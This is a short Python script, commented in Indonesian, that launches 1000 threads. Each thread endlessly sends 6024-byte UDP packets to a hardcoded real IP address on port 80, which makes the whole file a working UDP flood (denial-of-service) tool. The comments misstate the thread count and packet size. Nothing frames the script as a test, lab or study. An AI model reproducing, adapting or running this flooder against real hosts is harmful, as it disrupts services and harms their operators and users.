import socket
import threading

def send_udp(max_bytes):
    while True:
        # Membuat socket UDP
        udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        # Mengganti alamat dan port sesuai kebutuhan (contoh: alamat IP dan port)
        server_address = ('158.220.106.212', 80)

        # Membuat data yang akan dikirim (misalnya, mengisi data dengan karakter 'A' sebanyak max_bytes)
        data_to_send = b'A' * max_bytes

        # Mengirim data
        udp_socket.sendto(data_to_send, server_address)

        # Menutup koneksi
        udp_socket.close()
        print(f"UDP packet (max {max_bytes} bytes) sent successfully!")

# Membuat 10 thread, masing-masing mengirimkan paket UDP maksimum 1024 bytes
max_udp_bytes = 6024
threads = []
for _ in range(1000):
    thread = threading.Thread(target=send_udp, args=(max_udp_bytes,))
    threads.append(thread)

# Menjalankan setiap thread
for thread in threads:
    thread.start()

# Menunggu hingga semua thread selesai
for thread in threads:
    thread.join()
